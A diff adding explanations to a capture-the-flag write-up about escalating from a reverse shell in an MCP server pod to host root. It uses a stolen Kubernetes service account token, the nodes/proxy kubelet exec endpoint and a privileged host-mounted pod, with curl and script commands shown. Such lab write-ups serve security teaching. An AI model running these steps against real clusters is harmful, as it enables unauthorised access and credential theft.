@@ -515,6 +515,11 @@ curl -s -X POST http://127.0.0.1:30080/mcp \
 
 ![[Pasted image 20260809001106.png]]
 
+**What Happens:**
+1. The request calls the tool we registered
+2. The server executes our Python code
+3. A reverse shell connects back to our listener
+4. We now have shell access inside the MCP pod
 
 **Result:**
 ```bash
@@ -545,16 +550,29 @@ mcp@mcp-server-54464cb475-29ztf:/$ ls -la /var/run/secrets/kubernetes.io/service
 
 ![[Pasted image 20260809002342.png]]
 
+**What We Found:**
+- `token` - Service account authentication token
+- `ca.crt` - Cluster CA certificate
+- `namespace` - Current namespace (default)
+
+**What This Tells Us:** We're inside a Kubernetes pod! The service account files are automatically mounted by Kubernetes.
 
 ```bash
 mcp@mcp-server-54464cb475-29ztf:/$ env | grep KUBERNETES
 ```
 
+**Environment Variables:**
 ![[Pasted image 20260809002410.png]]
 
+**Analysis:**
+- `10.43.0.1` is the Kubernetes API server
+- We can interact with the API using our service account token
 
-### API Permissions Check
+### Understanding Kubernetes RBAC
 
+**RBAC** = Role-Based Access Control. It determines what a service account can do in the cluster.
+
+### Checking Our Permissions
 ```bash
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 API=https://10.43.0.1:443
@@ -577,11 +595,25 @@ curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
 }
 ```
 
+
 ![[Pasted image 20260809002610.png]]
 The `nodes/proxy` permission allows executing commands on any pod in the cluster via the kubelet API
 
+#### Why nodes/proxy is Dangerous
 
-### Identify Privileged Pod
+**What is nodes/proxy?** It's a Kubernetes subresource that allows you to:
+1. Proxy HTTP requests to the kubelet on a node
+2. The kubelet runs on port 10250
+3. Through the proxy, you can reach ANY kubelet endpoint
+
+**Kubelet Endpoints:**
+- `/pods` - List all pods on the node
+- `/exec` - Execute commands in containers
+- `/run` - Run commands non-interactively
+
+**Attack Vector:** With `nodes/proxy` access, we can execute commands in ANY container on the node, even if the pod doesn't have the right permissions!
+
+### Finding a Privileged Pod
 
 ```bash
 curl -sk "https://10.129.6.42:10250/pods" \
@@ -603,13 +635,22 @@ for item in data['items']:
 
 ![[Pasted image 20260809002639.png]]
 
+**What This Code Does:**
+1. Queries the kubelet on port 10250 for all pods
+2. Checks each pod for:
+    - `securityContext.privileged: true` (privileged container)
+    - `hostPath` mounts (access to host filesystem)
+3. Prints matching pods
 
 **Result:**
 ```bash
 [!] PRIVILEGED: monitoring/prometheus-prometheus-node-exporter-nmntq - container: node-exporter - hostPaths: ['/proc', '/sys', '/']
 ```
 
-
+**Why This Pod is Perfect:**
+1. It's **privileged** - runs with root privileges
+2. It mounts **/host** (the host filesystem)
+3. We can exec into it and access the host filesystem!
 
 ---
 
@@ -658,8 +699,16 @@ EOF
 
 ![[Pasted image 20260809003011.png]]
 
+**Script Explanation:**
+1. **WebSocket Connection:** The kubelet uses WebSockets for exec commands
+2. **SSL Configuration:** We ignore certificate validation (self-signed)
+3. **URL Construction:**
+    - `wss://{NODE}:10250/exec/{namespace}/{pod}/{container}`
+    - With query parameters for the command
+4. **Authentication:** We use our service account token in the header
+5. **Output Reading:** The kubelet sends multiplexed streams (stdout, stderr)
 
-### Execute and Read Root Flag
+### Installing Required Module
 
 ```bash
 # Install websockets if needed
@@ -669,7 +718,7 @@ pip3 install websockets
 python3 /tmp/kube_exec.py "cat /host/root/root/root.txt"
 ```
 
-
+### Reading the Root Flag
 ![[Pasted image 20260809003210.png]]
 
 
